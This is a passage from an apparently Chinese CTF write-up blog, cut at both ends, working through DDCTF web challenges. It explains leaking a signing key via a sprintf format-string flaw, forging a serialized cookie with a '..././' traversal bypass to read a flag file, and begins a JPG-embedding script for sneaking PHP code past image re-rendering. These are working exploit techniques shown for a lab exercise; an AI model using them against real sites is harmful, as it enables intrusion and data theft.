class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;Application.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration            = <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">&#x27;ddctf_id&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path                = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain                = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure                = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">&quot;DiDiCTF&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">&#x27;DiDI Welcome you %s&#x27;</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">                <span class="built_in">parent</span>::response($data,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">&#x27;DiDI Welcome you&#x27;</span>;</span><br><span class="line">                <span class="built_in">parent</span>::response($data,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">&#x27;../config/key.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;session not found&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;the cookie data not match&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;session_id&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;ip_address&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;user_agent&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">&quot;nickname&quot;</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">parent</span>::response($data,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">&#x27;ip_address&#x27;</span>] != $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the ip addree not match&#x27;</span>.<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">&#x27;user_agent&#x27;</span>] != $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the user agent not match&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;session_id&#x27;</span> =&gt; md5(uniqid($sessionid,<span class="literal">TRUE</span>)),</span><br><span class="line">            <span class="string">&#x27;ip_address&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>分析这两个php文件，仅仅两个类而已，不过本人太菜，分析了1天，第一个文件<code>app/Application.php</code>定义了一个<code>Application</code>类；第二个文件<code>app/Session.php</code>也是一个类，不过这个<code>Session</code>类是继承于<code>Application</code>类，然后最后定义一个对象<code>ddctf</code>,这个对象调用<code>index()</code>函数。大概过程就是这样，比较简单。主要就是里面的东西。接下来稍微具体的分析下两个文件里面功能设计。</p></blockquote><blockquote><p>第一个文件：首先是定义了一个<code>$path</code>；然后是<code>response()</code>函数，这个函数主要是输出信息的，接着是<code>auth()</code>认证函数，这个就是控制访问权限的，可以看到要想通过认证，必须使<code>$_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]</code>等于<code>admin</code>,即HTTP头部字段<code>didictf_username</code>为<code>admin</code>；接下来是<code>sanitizepath()</code>函数，这个函数是对变量<code>path</code>的字符串的过滤，这个地方随后会用的到，开始没想到这个地方；接下来就是类中的析构函数<code>__destruct</code>，可以看到，如果<code>path</code>变量为空，就会退出，<code>path</code>变量长度不是18位也会退出，最后是读取<code>path</code>路径的文件内容并使用<code>response()</code>输出。</p></blockquote><blockquote><p>第二个文件：继承于上个文件中的类，之前说过，里面开始定义了一些类中变量；下面第一个函数为<code>index()</code>函数，这个文件在这里面也是相当于一个主函数了，里面主要调用的是<code>session_read()</code>和<code>session_create()</code>两个函数，同时还使用<code>parent</code>关键字调用使用父类中的<code>response()</code>函数；还有一个<code>get_key()</code>函数，功能是相当于读取<code>../config/key.txt</code>中8位的密钥吧，之前也有提示下面会用到，不过此处有个提示<code>//eancrykey  and flag under the folder</code>,提示说的是<code>flag</code>也在这个文件夹下。</p></blockquote><blockquote><p>具体还是说一下<code>session_read()</code>和<code>session_create()</code>两个函数，在<code>index()</code>函数里面，如果请求包里面没有设置<code>cookie</code>就会启用<code>session_create()</code>函数，反之，设置有<code>cookie</code>,就会调用<code>session_create()</code>函数。<code>session_create()</code>函数是创建cookie的函数，里面没什么要说的；<code>session_read()</code>函数是读取cookie，通过分析可以知道，如果我们知道key就可以任意构造cookie了，关键是如何将key值输出。关键代码如下：</p></blockquote><pre><code>&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $arr = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;],&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;eancrykey);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $data = &lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome my friend %s&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt; ($arr &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $k =&amp;gt; $v) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           $data = sprintf($data,$v);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;parent&lt;/span&gt;::response($data,&lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre><blockquote><p>可以看到此处有输出数组，但是关键此处输出只能输出nickname的值，因为nickname的值把%s占位符替代之后，循环到<code>$this-&gt;eancrykey</code>时候，就无法输出<code>$this-&gt;eancrykey</code>，例如假如post的数据为nickname=zzqsmile,$data就变成了”Welcome my friend zzqsmile”,此时我们要仔细想一想如和才能绕过第一个POST的数据，来输出$this-&gt;eancrykey，仔细想下可能会想到吧，就是直接传入<code>%s</code>作为nickname变量的值，这样就能够将遍历到<code>$this-&gt;eancrykey</code>的值拼接到$data并通过父类response()函数输出。拿到$this-&gt;eancrykey的值就可以随便构造Cookie。</p></blockquote><blockquote><p>分析到这人已经蒙了，怎么才能输出flag呢？这时候又要回去看<code>Application.php</code>文件中类的析构函数了，析构函数中可以读取<code>$path</code>的文件内容，因此，仅仅需要用心构造好一个cookie，将文件路径写进$path，等到触发析构函数的时候让其输出flag文件内容，此时又需要一个脑洞，通过提示知道文件路径是18位，flag文件和key在一个文件夹下，因此猜想路径为<code>../config/flag.txt</code>,正好18位。但是之前对<code>../</code>进行过滤了，所以在构造序列化对象时候要构造成<code>..././config/flag.txt</code>，分析完之后就开干。</p></blockquote><blockquote><p>访问<code>app/Session.php</code>文件。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-522c073c2caf7034.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>可以看到开始没有cookie时会设置cookie。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-016596ada51019bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>可以看到图中标记红色部分<code>1a303cbea7ecff312df1cbd194e1def0</code>即是<code>$cookiedata.md5($this-&gt;eancrykey.$cookiedata);</code>的结果。这个cookie是通过是一个合法的cookie，那么如果我们将这段合法的cookie带进头部，程序是不是就会读取这段cookie了，这样程序就会执行到<code>session_read()</code>里面，如下：</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-e90ce3f8764b4cee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>没毛病，按照之前分析，下一步得到<code>$this-&gt;eancrykey</code>的值<code>EzblrbNS</code>，不过此处要注意的是<code>Content-Type:</code>字段值是否为：<code>application/x-www-form-urlencoded</code>，关键点都已在下图标出。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-6745c8a86d272f51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>得到<code>$this-&gt;eancrykey</code>值接下来就写个很low的脚本构造下cookie。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path &#x3D; &#39;...&#x2F;.&#x2F;config&#x2F;flag.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$this-&gt;eancrykey</span><br><span class="line">$zzz &#x3D; new Application();</span><br><span class="line">$b &#x3D; serialize($zzz); </span><br><span class="line">echo &quot;$b&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#x2F;&#x2F;$b&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;</span><br><span class="line">$a &#x3D; $b.md5(&#39;EzblrbNS&#39;.$b);</span><br><span class="line">echo $a; </span><br><span class="line">&#x2F;&#x2F;$a&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee2 </span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo urlencode($a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;urlencode($a)&#x2F;&#x2F;  O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>最后成功拿到flag。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-55d4a65bf7b8ae24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h5 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h5><ul><li><p>题目地址</p><p>  [<a href="http://117.51.148.166/upload.php%EF%BC%89(http://117.51.148.166/upload.php)">http://117.51.148.166/upload.php）(http://117.51.148.166/upload.php)</a></p></li><li><p>解题过程</p></li></ul><p>1). 按照给的认证用户名，密码进入题目</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-acbe98e459b5fe62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c6852cfcdc0361e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>通过测试发现，主要是只能上传图片，题目是通过文件内容中有<code>phpinfo()</code>字符串来决定是否通关的，测试发现，上传的图片是被经过<code>二次渲染</code>的，因此，就要绕过二次渲染，使其<code>phpinfo()</code>内容不发生改变。</p></blockquote><p>2). 直接用据说国外牛人写的脚本制作图片马。</p><p><strong>脚本jpg_payload.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span 